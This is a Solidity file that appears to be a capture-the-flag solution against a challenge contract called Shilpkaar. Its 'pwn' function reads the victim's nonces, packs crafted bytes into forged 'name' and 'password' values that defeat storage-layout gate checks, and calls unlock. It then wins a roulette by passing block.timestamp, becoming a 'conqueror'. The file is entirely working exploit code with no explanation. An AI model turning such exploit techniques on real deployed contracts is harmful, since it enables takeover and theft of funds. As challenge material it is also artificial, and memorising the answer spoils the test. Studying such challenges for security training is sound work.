// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IShilpkaar {
    function unlock(bytes32 _name, bytes32 _password) external;

    function roulette(uint256 _secretNumber) external;

    function garbageNonce() external view returns (uint256);

    function masterNonce() external view returns (uint256);

    function shilpkaar(address player) external view returns (bool);

    function conquerors(address player) external view returns (bool);
}

// https://www.numberempire.com/primenumbers.php
// https://goodcalculators.com/big-number-calculator/
// https://primes.utm.edu/lists/2small/0bit.html

contract ShilpkaarSolution {
    IShilpkaar public victim;

    function pwn(address victim_) external {
        victim = IShilpkaar(victim_);

        // UNLOCK

        uint256 garbageNonce = victim.garbageNonce();
        uint256 masterNonce = victim.masterNonce();

        // Slot 0
        address garbageAddress = address(uint160(2**153 + garbageNonce + 1));
        bool gate1Unlocked = true; // Must be true
        uint16 gateKey1 = 139 + uint16(masterNonce);
        uint72 rouletteStartTime = 0;

        bytes32 name = bytes32(abi.encodePacked(rouletteStartTime, gateKey1, gate1Unlocked, garbageAddress));

        uint64 gateKeysCompensation = uint64(2**63 - ((uint256(type(uint64).max) * 49) / 100));

        // Slot 1
        uint64 gateKey2 = type(uint64).max;
        uint64 gateKey3 = 2**63 - 44 - gateKeysCompensation;
        bool gate2Unlocked = true; // Must be true
        uint64 gateKey4 = 2**63 - 92 + gateKeysCompensation;
        uint56 gateKey5 = type(uint56).max;

        bytes32 password = bytes32(abi.encodePacked(gateKey5, gateKey4, gate2Unlocked, gateKey3, gateKey2));

        victim.unlock(name, password);

        // ROULETTE
        require(victim.shilpkaar(address(this)), "Not Shilpkaar");

        victim.roulette(block.timestamp);

        require(victim.conquerors(address(this)), "Not Conqueror");
    }
}
